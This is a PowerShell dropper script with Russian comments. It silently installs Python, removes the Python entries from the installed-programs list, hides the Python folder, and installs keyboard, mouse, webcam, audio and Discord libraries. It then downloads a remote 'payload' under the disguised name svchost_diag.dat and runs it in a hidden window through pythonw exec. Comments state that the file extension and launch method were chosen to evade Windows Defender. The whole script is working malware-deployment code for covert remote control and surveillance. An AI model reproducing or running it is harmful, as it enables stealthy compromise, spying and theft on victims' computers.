$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = 'SilentlyContinue'

$logPath = "$env:TEMP\deploy.log"
function Log($msg) { "[$(Get-Date -Format 'HH:mm:ss')] $msg" | Out-File -Append -Encoding utf8 $logPath }

Log "=== deploy start ==="

$pyPath = "$env:LOCALAPPDATA\Programs\Python\Python311\python.exe"
$pyw    = "$env:LOCALAPPDATA\Programs\Python\Python311\pythonw.exe"

if (-not (Test-Path $pyPath)) {
    Log "Installing Python 3.11..."
    $wc = New-Object Net.WebClient
    $wc.DownloadFile("https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe", "$env:TEMP\py_setup.exe")
    Start-Process -FilePath "$env:TEMP\py_setup.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 Include_launcher=0 AssociateFiles=0 Shortcuts=0" -Wait
    Remove-Item "$env:TEMP\py_setup.exe" -Force -ErrorAction SilentlyContinue

    $junkFolder = "$env:USERPROFILE\Desktop\параметры"
    if (Test-Path $junkFolder) { Remove-Item $junkFolder -Recurse -Force }

    # Убрать из списка программ
    $ub1 = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $ub1 -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force
    $ub2 = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall"
    Get-ChildItem $ub2 -ErrorAction SilentlyContinue | Where-Object { $_.GetValue("DisplayName") -like "*Python*" } | Remove-Item -Recurse -Force

    $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
    if (-not (Test-Path $pyPath)) { $pyPath = "python.exe"; $pyw = "pythonw.exe" }
    Log "Python installed: $pyPath"
}

$deps = @(
    "discord.py", "keyboard", "mouse", "psutil", "pyttsx3",
    "requests", "pywin32", "pycryptodome", "Pillow", "comtypes",
    "pycaw", "opencv-python", "pyaudio"
)
Log "Installing deps..."
& $pyPath -m pip install --upgrade pip -q 2>&1 | Out-Null
& $pyPath -m pip install @deps -q 2>&1 | Out-Null
Log "Deps done"

# Скрыть каталог Python
attrib +h +s "$env:LOCALAPPDATA\Programs\Python" | Out-Null

# Скачать payload как .dat (Defender меньше реагирует на не-py расширение)
$botPath = "$env:TEMP\svchost_diag.dat"
$repoUrl = "https://raw.githubusercontent.com/ht-at/DOTAMOD/refs/heads/main/DOTA.py"
Log "Downloading payload..."
$wc2 = New-Object Net.WebClient
$wc2.DownloadFile($repoUrl, $botPath)
Log "Payload saved: $botPath"

# Запуск через pythonw.exe (не RuntimeBroker — Defender бьёт хуристикой)
# exec через -c чтобы не было .py процесса в памяти с именем файла
$args = "-W ignore -c `"exec(open(r'$botPath').read())`""
Start-Process -FilePath $pyw -ArgumentList $args -WindowStyle Hidden
Log "Bot launched via pythonw.exe -c exec(open(dat).read())"
Log "=== deploy done ==="
